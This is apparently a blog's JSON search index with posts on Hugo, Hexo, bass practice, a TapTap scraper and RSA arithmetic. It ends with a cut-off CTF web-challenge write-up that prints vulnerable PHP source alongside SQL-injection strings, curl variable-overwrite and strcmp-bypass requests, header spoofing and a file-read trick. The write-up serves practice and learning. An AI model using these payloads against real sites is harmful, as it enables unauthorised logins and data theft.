
[{"content":"I\u0026rsquo;m a student who is interested in computer science and LLMs. I\u0026rsquo;m currently a PhD student at the Sun Yat-sen University in Shenzhen, China.\nWith the advancement of LLMs, documenting my problem-solving process has become quite straightforward. Thus, I\u0026rsquo;ve decided to revive my blog.\nWhy Hugo? # Hugo is a static site generator that is very fast and efficient. It is also very easy to customize. And I discovered a fantastic theme called Blowfish. So I decided to give it a go.\nWhat will I do? # I\u0026rsquo;ll document my problem-solving and learning journey in a more detailed and organized manner. I aim to write English blog posts to practice my language skills. I will also post some interesting things in my life here. ","date":"2025-04-07","externalUrl":null,"permalink":"/about/","section":"wicsp's blog","summary":"","title":"About Me","type":"page"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/","section":"wicsp's blog","summary":"","title":"wicsp's blog","type":"page"},{"content":"","date":"2025-04-01","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/tags/blowfish/","section":"Tags","summary":"","title":"Blowfish","type":"tags"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/tags/hugo/","section":"Tags","summary":"","title":"Hugo","type":"tags"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/tags/math/","section":"Tags","summary":"","title":"Math","type":"tags"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-03-31","externalUrl":null,"permalink":"/categories/tools/","section":"Categories","summary":"","title":"Tools","type":"categories"},{"content":" 本文为测试页面，介绍了在 Blowfish@Hugo 中使用数学表达式的方法。\nRef：Blowfish 数学表达式\nKaTeX 可用于在文章中呈现数学表达式。\n如果您想要使用数学符号，Blowfish 会将 KaTeX 自动加入到您的项目中。只需在文章中包含 katex 短代码 即可。参考下面的例子\n内联表示法 # 可以通过将表达式包装在 \\\\( 和 \\\\) 分隔符中来生成内联表示法。 例如：\n% KaTeX inline notation Inline notation: \\\\(\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…\\\\) Inline notation: \\(\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…\\)\n表达式块 # 可以使用 $$ 分隔符生成表达式块。这将在其 HTML 块中输出表达式。\n例如：\n% KaTeX block notation $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2025-03-31","externalUrl":null,"permalink":"/posts/blowfishhugo-math-support/","section":"Posts","summary":"","title":"在 Blowfish@Hugo 中使用数学表达式","type":"posts"},{"content":"","date":"2024-08-06","externalUrl":null,"permalink":"/tags/bass/","section":"Tags","summary":"","title":"Bass","type":"tags"},{"content":"","date":"2024-08-06","externalUrl":null,"permalink":"/categories/music/","section":"Categories","summary":"","title":"Music","type":"categories"},{"content":"","date":"2024-08-06","externalUrl":null,"permalink":"/tags/music/","section":"Tags","summary":"","title":"Music","type":"tags"},{"content":" {% cq %} 练习是提高技能的唯一途径。 {% endcq %}\n0x00 基本功练习 # {% tabs 基本功练习 %}\n爬格子\n左手灵活性练习\n右手基础\n右手地狱\n26 min 右手究极地狱速力耐久训练\n基础演奏\n快速启动\nSlap基础\nSlap进阶\n{% endtabs %}\n0x01 练习曲 # {% tabs 练习曲 %}\nSlap练习曲\n爱人错过\n{% endtabs %}\n","date":"2024-08-06","externalUrl":null,"permalink":"/posts/bass-basic-practice/","section":"Posts","summary":"","title":"贝斯基本功跟练","type":"posts"},{"content":"","date":"2024-07-20","externalUrl":null,"permalink":"/tags/hexo/","section":"Tags","summary":"","title":"Hexo","type":"tags"},{"content":"本文介绍了我在部署和使用 Hexo 和NexT的过程中遇到的问题和解决方法，仅供参考\nhexo: 7.3.0 hexo-cli: 4.3.2 NexT: 8.20.0\n0x00 部署 Hexo 到 GitHub Page 后，自定义域名 (Custom Domain) 失效 # 在 source 文件夹下新建 CNAME 文件，其中写入绑定的域名即可。\n0x01 部署 Hexo 到 GitHub Page 后, 如何展示自定义的 404 页面 # 在 source 文件夹下新建 404.md 文件，示例内容如下\n--- title: 404 permalink: /404.html comments: false --- \u0026lt;center\u0026gt;404 Not Found\u0026lt;/center\u0026gt; --- 对不起，您所访问的页面不存在或者已删除 Ref: GitHub Docs Gui Blog\n0x02 NexT 主体下 Waline 评论系统调整 # {% note warning %} Waline 已经更新到了 3.0 版本，但是 NexT 主题的 Waline 仍然使用的是 client@v2，因此在使用时可能会出现一些问题。 {% endnote %}\n由于 Valine 的 XSS 漏洞，NexT 不再对 Vline 提供原生支持。 Waline 解决了安全性问题，虽然 NexT 展示也没有原生支持 Waline，但是可以通过配置文件进行修改。 Waline安装和配置参考官方文档 ；Waline for Hexo NexT 网上教程很多，这里不再赘述。\n增加自动暗黑模式 # 在 waline: 下增加 dark: auto 示例如下：\nwaline: enable: true #是否开启 dark: auto 自定义用户头像风格 # 自定义用户的头像可以参考这里，能把原本很丑的默认头像变好看一点。\n增加 Search 功能 # Ref: Hexo-Next Doc\n并不知道 hexo-generator-searchdb 和 hexo-generator-search的区别。。\n不蒜子本地部署时统计有误 # 三项统计数据都异常大\n{% gp %} {% endgp %}\n网上得到的结果是：正常现象，由于本地部署时大家都使用一样的 IP 地址，所以统计数据会出现问题。线上部署后问题消失。\n部署时每次都要 Hexo g \u0026amp; Hexo d 太麻烦 # 博客修改后直接使用 hexo d -g 即可。\nVSCode 粘贴图片指定默认路径 # 使用 VScode 自带的 markdown copy file 功能，允许将图片直接粘贴进 Markdown 文档，并自动将图片保存在指定目录。\n使用快捷键 Command + , 打开设置，搜索 markdown，找到 Markdown\u0026gt; Copy Files：Destnation，添加一项 key 为 * , value 为 ${documentWorkspaceFolder}/source/uploads/${documentBaseName}/ 。\n我这里在 source 文件夹下新建了一个 uploads 文件夹，用于存放图片，并将图片保存在与 markdown 文件同名的文件夹下。\n截图后直接在文档中粘贴，结果如下：\n{% note info %} 现在已使用图床，不再使用本地图片 {% endnote %}\n设置博文在主页展示的长度 # 在文中合适位置加入 \u0026lt;!-- more --\u0026gt; 即可。\nMathJax 优化 # 使用默认的markdown 渲染器 marked 时公式会出现冲突 (doc), 因此替换渲染器为 pandoc（需要在系统中下载pandoc）。若安装后还是报错，重启电脑后即可解决。\n执行\nnpm un hexo-renderer-marked --save npm i hexo-renderer-pandoc --save # 需要先在本地安装 pandoc hexo clean 使用pangu 优化排版 # 在配置文件中启用 pangu 即可\n# _config.yml # Pangu Support # For more information: https://github.com/vinta/pangu.js # Server-side plugin: https://github.com/next-theme/hexo-pangu pangu: true favicon 相关 # 除了主题config中的设置，还可以自己加入一些其他平台的favicon，这里推荐一个工具Favicon Checher 检测自己网站的favicon情况，然后使用官方提供的 Favicon Genarator 生成并补全 favicon文件。\n","date":"2024-07-20","externalUrl":null,"permalink":"/posts/hexo-issues/","section":"Posts","summary":"","title":"Hexo \u0026 NexT 部署和使用过程中问题合集/Hexo Issues Set","type":"posts"},{"content":" Ref: https://wiki.archlinux.org/index.php/Libinput\n","date":"2020-11-30","externalUrl":null,"permalink":"/posts/enable-tapping-to-click-with-libinput-on-arch-linux/","section":"Posts","summary":"","title":"Arch Linux 允许通过轻触触摸板执行点击","type":"posts"},{"content":"","date":"2020-11-30","externalUrl":null,"permalink":"/tags/libinput/","section":"Tags","summary":"","title":"Libinput","type":"tags"},{"content":"","date":"2020-11-30","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"2020-09-08","externalUrl":null,"permalink":"/categories/programming/","section":"Categories","summary":"","title":"Programming","type":"categories"},{"content":"","date":"2020-09-08","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"2020-09-08","externalUrl":null,"permalink":"/tags/spider/","section":"Tags","summary":"","title":"Spider","type":"tags"},{"content":" 爬虫小项目代码存档\nimport requests import time from lxml import etree import json import pickle class Tapspider: def __init__(self): self.responses = list() self.datas = list() self.get_page() self.get_game_info() self.save_data(self.datas, \u0026#39;DownloadList\u0026#39;) def get_datas(self, code): base_url = \u0026#39;http://www.taptap.com/app/\u0026#39; url = base_url+code html = self.get_game_page(url) result = etree.HTML(html) test = -1 free = -1 installs = -1 pre_reg = -1 purchases = -1 game_info = result.xpath(\u0026#34;//div[@class=\u0026#39;app-data-wrap\u0026#39;]/p/span/text()\u0026#34;) # print(node) # print(type(node)) print(len(game_info)) if len(game_info) == 1: test = 1 installs = -1 pre_reg = -1 purchases = -1 followers = str(game_info[0]).replace(\u0026#39; 人关注\u0026#39;,\u0026#39;\u0026#39;) else: print(game_info[0]) print(type(game_info[0])) if \u0026#39;购买\u0026#39; in str(game_info[0]): purchases = str(game_info[0]).replace(\u0026#39; 人购买\u0026#39;, \u0026#39;\u0026#39;) elif \u0026#39;安装\u0026#39; in str(game_info[0]): installs = str(game_info[0]).replace(\u0026#39; 人安装\u0026#39;, \u0026#39;\u0026#39;) free = 1 elif \u0026#39;预约\u0026#39; in str(game_info[0]): pre_reg = str(game_info[0]).replace(\u0026#39; 人预约\u0026#39;, \u0026#39;\u0026#39;) followers = str(game_info[1]).replace(\u0026#39; 人关注\u0026#39;,\u0026#39;\u0026#39;) return test, free, installs, pre_reg, purchases ,followers def get_game_info(self): for response in self.responses: html = json.loads(response)[\u0026#39;data\u0026#39;][\u0026#39;html\u0026#39;] results = etree.HTML(html) game_list = results.xpath( \u0026#34;//div[@class=\u0026#39;taptap-top-card\u0026#39;]\u0026#34;) print(len(game_list)) response_num = self.responses.index(response) for game in game_list: game_num = game_list.index(game) print(\u0026#39;正在获取第%d个游戏的信息\u0026#39; % (response_num*30+game_num+1)) order = str(game.xpath( \u0026#34;./span[@class =\u0026#39;top-card-order-text orange \u0026#39;]/text() | ./span[@class = \u0026#39;top-card-order-text \u0026#39;]/text() | ./span[@class=\u0026#39;top-card-order-text small-font\u0026#39;]/text()\u0026#34;)[0]) name = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/a[@class=\u0026#39;card-middle-title \u0026#39;]/h4/text()\u0026#34;)[0]).strip().strip(\u0026#39;\\n\u0026#39;) developer = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/p[@class=\u0026#39;card-middle-author\u0026#39;]/a/text()\u0026#34;)[0]).strip(\u0026#39;厂商:\\xa0\u0026#39;) score = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/div[@class=\u0026#39;card-middle-score\u0026#39;]/p/span/text()\u0026#34;)[0]) description = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/p[@class=\u0026#39;card-middle-description\u0026#39;]/text()\u0026#34;)[0]).strip().strip(\u0026#39;\\n\u0026#39;) tags = game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/div[@class=\u0026#39;card-tags\u0026#39;]/a/text()\u0026#34;) for i in range(len(tags)): tags[i] = str(tags[i]) category = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/div[@class=\u0026#39;card-middle-category\u0026#39;]/a/text()\u0026#34;)[0]) game_code = str(game.xpath( \u0026#34;./div[@class=\u0026#39;top-card-middle\u0026#39;]/a[@class=\u0026#39;card-middle-title \u0026#39;]/@href\u0026#34;)[0]).replace(\u0026#39;https://www.taptap.com/app/\u0026#39;, \u0026#39;\u0026#39;) test, free, installs, pre_reg, purchases ,followers = self.get_datas(game_code) data = { \u0026#39;order\u0026#39;: order, \u0026#39;code\u0026#39;: game_code, \u0026#39;name\u0026#39;: name, \u0026#39;developer\u0026#39;: developer, \u0026#39;score\u0026#39;: score, \u0026#39;description\u0026#39;: description, \u0026#39;tags\u0026#39;: tags, \u0026#39;category\u0026#39;: category, \u0026#39;free\u0026#39;: free, \u0026#39;test\u0026#39;: test, \u0026#39;followers\u0026#39;: followers, \u0026#39;installs\u0026#39;: installs, \u0026#39;purchases\u0026#39;: purchases, \u0026#39;pre_reg\u0026#39;: pre_reg } print(data) self.datas.append(data) print(\u0026#39;共有%d个游戏\u0026#39; % len(self.datas)) def get_page(self): base_url = \u0026#34;http://www.taptap.com/ajax/top/download?\u0026#34; # 1:30, 2:30, 3:90 for i in range(5): page = str(i+1) total = str((i)*30) params = { \u0026#39;page\u0026#39;: page, \u0026#39;total\u0026#39;: total } headers = { \u0026#39;Usr-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36\u0026#39;} response = requests.get( base_url, params=params, headers=headers) print(\u0026#39;正在获取页面内容...\u0026#39;) print(\u0026#39;Page:\u0026#39;, response.url, \u0026#39;\\tstatus code:\u0026#39;, response.status_code, \u0026#39;\\tlength:\u0026#39;, len(response.text)) self.responses.append(response.text) print(\u0026#39;-------------------------------------------------\u0026#39;) def get_game_page(self, url): headers = { \u0026#39;Usr-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36\u0026#39;} response = requests.get( url, headers=headers) return response.text def save_data(self,datas, list_type): date = time.strftime(\u0026#34;%Y-%m-%d\u0026#34;, time.localtime()) filename = list_type +date +\u0026#39;.pkl\u0026#39; with open(\u0026#39;./\u0026#39;+filename,\u0026#39;wb\u0026#39;) as f: pickle.dump(datas,f) if __name__ == \u0026#39;__main__\u0026#39;: start = time.time() spider = Tapspider() end = time.time() print(\u0026#39;用时：\u0026#39;, end-start) ","date":"2020-09-08","externalUrl":null,"permalink":"/posts/taptap-spider/","section":"Posts","summary":"","title":"爬取 TapTap 网站上的游戏排行榜信息","type":"posts"},{"content":"","date":"2020-07-26","externalUrl":null,"permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA","type":"tags"},{"content":"按 RSA 算法规定有如下\n$p \\times q =n$\n$(p-1) \\times (q-1) = \\varphi(n)$\n任选整数 $e$ 使得 $\\gcd(e,\\varphi(n))=1$ ,整数 e 用做加密钥（注意：e 的选取是很容易的，例如，所有大于 p 和 q 的素数都可用）。\n确定的解密钥 d，满足$e \\times d == 1(\\mod n)$\n等价如下 $e \\times d - n \\times k =1$\n使用辗转相除法计算，分两种情况 # 1. 最后的 k 系数不为 1 # 例：令 $p=47$，$q=71$，求用 RSA 算法加密的公钥和私钥。\n计算如下：\n$n=pq=47\\times 71=3337$\n$φ(n)=(p-1) \\times (q-1)=46\\times 70=3220$\n随机选取$e=79$(满足与 3220 互质的条件)；\n则私钥 d 应该满足：$79\\times d \\mod 3220 = 1$\n那么这个式子 4 如何解呢？这里就要用到欧几里得算法(又称辗转相除法)，解法如下：\n(1)式子 4 可以表示成 $79\\times d-3220\\times k=1$(其中 k 为正整数)；\n(2)将 3220 对 79 取模得到的余数 60 代替 3220，则变为 $79\\times d-60\\times k=1$\n(3)同理，将 79 对 60 取模得到的余数 19 代替 79，则变为 $19\\times d-60\\times k=1$\n(4)同理，将 60 对 19 取模得到的余数 3 代替 60，则变为 $19\\times d-3\\times k=1$\n(5)同理，将 19 对 3 取模得到的余数 1 代替 19，则变为 $d-3\\times k=1$\n当 d 的系数最后化为 1 时，(注：当 k 的系数先化为 1 时，令 d=1，再带入)\n令 k=0，代入(5)式中，得 d=1； (注 d 系数先为 1 时， 此处第 1 个式子代入 k=0)\n将 d=1 代入(4)式，得 k=6；\n将 k=6 代入(3)式，得 d=19；\n将 d=19 代入(2)式，得 k=25；\n将 k=25 代入(1)式，得 d=1019，这个值即我们要求的私钥 d 的最终值。\n2. k 系数为 1 的情况 # 原式: $20\\times d mod 2000001 = 1$,求 d;\n用辗转相除法可转换为下列式子：\n(1) $20\\times d – 2000001 \\times k = 1$\n(2) $20\\times d – 1\\times k = 1$\n此时 k 的系数已经化为 1;\n令 d=1,带入(2)式中，得 k=19; (注：若 k 的系数为 1，则把 d=1 供入原式，求出 k)\n令 k=19,带入(1)式中，得 d=1900001\n解得：d=1900001\nRSA 中 MOD 快速指数 运算方法 # 快速指数法是运用公式：$(a \\times b)\\mod n = [(a \\mod n) \\times (b \\mod n)] \\mod n$\n例子：$15^{27}\\mod 33$\n$$ \\begin{equation}\\begin{split} 15^{27}\\mod 33 \u0026amp; = (15 \\times 15^{26})\\mod 33 \\ \u0026amp; = (15 \\times (15^2)^{13}) \\mod 33 \\ \u0026amp; = (15 \\times 27 ^{13} )\\mod 33 \\ \u0026amp; = (15 \\times 27 \\times 27 ^{12}) \\mod 33 \\ \u0026amp; = (9 \\times 27^{12}) \\mod 33 \\ \u0026amp; = (9 \\times (27^2)^6) \\mod 33 \\ \u0026amp; = (9 \\times 3 ^6 )\\mod 33 \\ \u0026amp; = (9\\times (3^2)^3 )\\mod 33 \\ \u0026amp; = (9 \\times 9^3 )\\mod 33 \\ \u0026amp; = (9\\times 9\\times 9^2)\\mod 33 \\ \u0026amp; =(15 \\times 15 )\\mod 33 \\ \u0026amp; = 27 \\mod 33 \\ \u0026amp; = 27 \\end{split}\\end{equation} $$\n","date":"2020-07-26","externalUrl":null,"permalink":"/posts/rsa-by-hand-calculation/","section":"Posts","summary":"","title":"手算 RSA","type":"posts"},{"content":" Nord # 一个好看的配色方案\nAn arctic, north-bluish color palette.\nA total of sixteen, carefully selected, dimmed pastel colors for a eye-comfortable, but yet colorful ambiance.\nCreated for clear, uncluttered and elegant designs following a minimal and flat style pattern. For syntax highlighting it aims to ensure an undisturbed focus on important parts of the code, a good readability and a quick visual distinction between the different syntax elements.\nNord consists of four named color palettes providing different syntactic meanings and color effects for dark \u0026amp; bright ambiance designs.\n看着确实舒服，留个存档。\n","date":"2020-02-10","externalUrl":null,"permalink":"/posts/an-arctic-north-bluish-color-palette/","section":"Posts","summary":"","title":"An Arctic, North Bluish Color Palette","type":"posts"},{"content":"","date":"2020-02-10","externalUrl":null,"permalink":"/tags/design/","section":"Tags","summary":"","title":"Design","type":"tags"},{"content":" 0x00 变量覆盖 # 给出代码如下\n\u0026lt;?php include(\u0026#34;secret.php\u0026#34;); if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { extract($_POST); if ($pass == $thepassword_123) { echo $theflag; } } ?\u0026gt; 其中重要的是这一句 if ($pass == $thepassword_123) ，题目名叫变量覆盖，猜想需要传入这两个变量覆盖默认的变量。\n在本地终端运行 curl http://chinalover.sinaapp.com/web18/index.php -X POST -d \u0026quot;pass=1\u0026amp;thepassword_123=1\u0026quot;\n成功取得 Flag\n0x01 PHP 是世界上最好的语言 # 又是这个域名，访问不了啊啊啊\n0x02 伪装者 # 通过搜索发现可以在 header 中加入 X-Forwarded-For: 127.0.0.1 达到本地登陆的效果，但是无效，加入 client-ip: 127.0.0.1 后成功\n0x03 HEADER # 又又又又又又挂了\n0x04 上传绕过 # 在网页元素中发现 upload.php 文件，内容为 Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件\n上传一张图片试试，提示 必须上传成后缀名为php的文件才行啊！\n做不来，各种姿势都尝试过了，以后再说。\n0x05 SQL 注入 1 # 给出源码\n\u0026lt;?php if($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\u0026#34;select user from ctf where (user=\u0026#39;\u0026#34;.$user.\u0026#34;\u0026#39;) and (pw=\u0026#39;\u0026#34;.$pass.\u0026#34;\u0026#39;)\u0026#34;; echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\u0026#34;admin\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Logged in! flag:******************** \u0026lt;/p\u0026gt;\u0026#34;; } if($query[user] != \u0026#34;admin\u0026#34;) { echo(\u0026#34;\u0026lt;p\u0026gt;You are not admin!\u0026lt;/p\u0026gt;\u0026#34;); } } echo $query[user]; ?\u0026gt; 构造 user=admin')#\u0026amp;pass=1 即可\n0x06 pass check # 给出代码\n$pass=@$_POST[\u0026#39;pass\u0026#39;]; $pass1=***********;//被隐藏起来的密码 if(isset($pass)){ if(@!strcmp($pass,$pass1)){ echo \u0026#34;flag:nctf{*}\u0026#34;; }else{ echo \u0026#34;the pass is wrong!\u0026#34;; } }else{ echo \u0026#34;please input pass!\u0026#34;; } ?\u0026gt; 尝试变量覆盖失败,查找 strcmp 函数的绕过方法。\nPhp5.3 之后版本使用 strcmp 比较一个字符串和数组的话,将不再返回-1 而是返回 0\n构造 curl http://chinalover.sinaapp.com/web21/ -X POST -d \u0026quot;pass[]=1\u0026quot;\n得到 Flag。\n0x07 起名字真难 # 给出源码\n\u0026lt;?php function noother_says_correct($number){ $one = ord(\u0026#39;1\u0026#39;); $nine = ord(\u0026#39;9\u0026#39;); for ($i = 0; $i \u0026lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit \u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ) { return false; } } return $number == \u0026#39;54975581388\u0026#39;; } $flag=\u0026#39;*******\u0026#39;; if(noother_says_correct($_GET[\u0026#39;key\u0026#39;])) echo $flag; else echo \u0026#39;access denied\u0026#39;; ?\u0026gt; key 不能为 1-9 的数字, 但是要求等于 \u0026lsquo;54975581388\u0026rsquo;\n这个数字刚好是 0xccccccccc ,传入参数得到 key\n0x08 密码重置 # 一看网址就发现了 base64 编码的参数，解密后 是 ctfuser，即当前页面的默认用户名。我们需要重置 admin 的密码，那么网址的参数需要改为 admin 的 base64 编码 YWRtaW4= 。\n然后发现表单中的用户名被设置成了 readonly ，按 F12 改为 admin 即可。\n0x09 SQL Injection # 网页中注释源码\n#GOAL: login as admin,then get the flag; error_reporting(0); require \u0026#39;db.inc.php\u0026#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[\u0026#39;username\u0026#39;]); $password = @clean((string)$_GET[\u0026#39;password\u0026#39;]); $query=\u0026#39;SELECT * FROM users WHERE name=\\\u0026#39;\u0026#39;.$username.\u0026#39;\\\u0026#39; AND pass=\\\u0026#39;\u0026#39;.$password.\u0026#39;\\\u0026#39;;\u0026#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) \u0026lt; 1){ die(\u0026#39;Invalid password!\u0026#39;); } echo $flag; stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。\n提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。\nhtmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为 html 实体,这样我们就不能闭合源码中的 ’ 了\n简单的说，就是我们加的 \\ 会被去掉，’ 或者 ” 会被转变。\n对于 PHP magic_quotes_gpc=on 的情况， 我们可以不对输入和输出数据库的字符串数据作 addslashes()和 stripslashes()的操作,数据也会正常显示。 如果此时你对输入的数据作了 addslashes()处理，那么在输出的时候就必须使用 stripslashes()去掉多余的反斜杠。\n对于 PHP magic_quotes_gpc=off 的情况\n必须使用 addslashes()对输入数据进行处理，但并不需要使用 stripslashes()格式化输出，因为 addslashes()并未将反斜杠一起写入数据库，只是帮助 mysql 完成了 sql 语句的执行。\n这个特性在 PHP5.3.0 中已经废弃并且在 5.4.0 中已经移除了（This feature has been DEPRECATED as of PHP 5.3.0 and REMOVED as of PHP 5.4.0.）。所以没有理由再使用魔术引号，因为它不再是 PHP 支持的一部分。 不过它帮助了新手在不知不觉中写出了更好（更安全）的代码。 但是在处理代码的时候，最好是更改你的代码而不是依赖于魔术引号的开启。\n查询语句： SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';\n整理后为SELECT * FROM users WHERE name=' username ' AND pass=' password ';\n构造 ?username=admin%20\\\u0026amp;password=%20or%201=1%23\n使得后台执行的语句为 SELECT * FROM users WHERE name=' admin \\' AND pass=' or 1=1\n0x0a 综合题 # jsfuck 编码，在 FireFox 的控制台里竟然没有办法直接运行！？还报了一行警告： Scam Warning: Take care when pasting things you don’t understand. This could allow attackers to steal your identity or take control of your computer. Please type ‘allow pasting’ below (no need to press enter) to allow pasting. 我觉得有道理，就放在 Chrome 的控制台里执行了。\n结果： 1bc29b36f623ba82aaf6724fd3b16718.php\n访问得到提示： 哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里\n说明在响应头里，得到提示 tip: history of bash\nbash 的历史记录储存在 .bash_history 文件里面，尝试访问。得到 zip -r flagbak.zip ./* ,一个打包的命令，下载该文件并解压，得到 Flag\n0x0b SQL 注入 2 # 题目说主要考察 UNION 查询，给出了源代码\n\u0026lt;?php if($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(\u0026#34;select pw from ctf where user=\u0026#39;$user\u0026#39;\u0026#34;)); if (($query[pw]) \u0026amp;\u0026amp; (!strcasecmp($pass, $query[pw]))) { echo \u0026#34;\u0026lt;p\u0026gt;Logged in! Key: ntcf{**************} \u0026lt;/p\u0026gt;\u0026#34;; } else { echo(\u0026#34;\u0026lt;p\u0026gt;Log in failure!\u0026lt;/p\u0026gt;\u0026#34;); } } ?\u0026gt; 查询语句 select pw from ctf where user='$user' ，将 pass 进行 MD5 加密后与选到的密码进行对比。\n构造 user=%27union select md5(1)%23\u0026amp;pass=1 即可\n0x0c 综合题 2 # 一个很有意思的网站，先收集一下信息。 # index.php 主页文件 about.php 可以查看其他文件 sm.txt CMS 的说明文档 config.php 数据库信息 passencode.php 加密算法 say.php 用于接受和处理用户留言请求 so.php 搜索 preview.php 预览 admin 表结构 create table admin ( id integer, username text, userpass text, )\n已知页面的参数\nabout.php?file= 可以传一个 file 参数 index.php?page=1 在第二页发现内容 \u0026lt;?php eval($_POST['1:123',1)# say.php say.php?nice=\u0026amp;usersay=\u0026amp;Submit=确认提交 尝试通过 about.php 获取其他文件内容。 # index.php\n\u0026lt;?php if(!isset($_COOKIE[\u0026#39;username\u0026#39;])){ setcookie(\u0026#39;username\u0026#39;,\u0026#39;\u0026#39;); setcookie(\u0026#39;userpass\u0026#39;,\u0026#39;\u0026#39;); } ?\u0026gt; \u0026lt;?php //这里输出用户留言 include \u0026#39;antixss.php\u0026#39;; include \u0026#39;config.php\u0026#39;; $con = mysql_connect($db_address,$db_user,$db_pass) or die(\u0026#34;不能连接到数据库！！\u0026#34;.mysql_error()); mysql_select_db($db_name,$con); $page=$_GET[\u0026#39;page\u0026#39;]; if($page==\u0026#34;\u0026#34; || $page==0){ $page=\u0026#39;1\u0026#39;; } $page=intval($page); $start=($page-1)*7; $last=$page*7; $result=mysql_query(\u0026#34;SELECT * FROM `message` WHERE display=1 ORDER BY id LIMIT $start,$last\u0026#34;); if(mysql_num_rows($result)\u0026gt;0){ while($rs=mysql_fetch_array($result)){ echo htmlspecialchars($rs[\u0026#39;nice\u0026#39;],ENT_QUOTES).\u0026#34;:\u0026lt;br /\u0026gt;\u0026#34;; echo \u0026#39;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#39;.antixss($rs[\u0026#39;say\u0026#39;]).\u0026#39;\u0026lt;br /\u0026gt;\u0026lt;hr /\u0026gt;\u0026#39;; } } mysql_free_result($result); ?\u0026gt; \u0026lt;?php $contents=mysql_query(\u0026#34;SELECT * FROM `message` WHERE display=1\u0026#34;); if(mysql_num_rows($contents)\u0026gt;0){ $num=mysql_num_rows($contents); if($num%8!=0){ $pagenum=intval($num/8)+1; } else{ $pagenum=intval($num/8); } for($i=1;$i\u0026lt;=$pagenum;$i++){ echo \u0026#39;\u0026lt;a href=\u0026#34;index.php?page=\u0026#39;.htmlspecialchars($i).\u0026#39;\u0026#34;\u0026gt;\u0026#39;.htmlspecialchars($i).\u0026#39;\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026#39;; } } mysql_free_result($contents); mysql_close($con); ?\u0026gt; 在文件前看到 setcookie 函数，查看响应头发现格式如下。 username=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT userpass=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT\nabout.php\n\u0026lt;?php $file=$_GET[\u0026#39;file\u0026#39;]; if($file==\u0026#34;\u0026#34; || strstr($file,\u0026#39;config.php\u0026#39;)){ echo \u0026#34;file参数不能为空！\u0026#34;; exit(); } else{ $cut=strchr($file,\u0026#34;loginxlcteam\u0026#34;); if($cut==false){ data=file_get_contents($file); $date=htmlspecialchars($data); echo $date; } else{ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;敏感目录，禁止查看！但是。。。\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; } } so.php\n\u0026lt;?php if($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]!=\u0026#34;Xlcteam Browser\u0026#34;){ echo \u0026#39;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~\u0026#39;; exit(); } $id=$_POST[\u0026#39;soid\u0026#39;]; include \u0026#39;config.php\u0026#39;; include 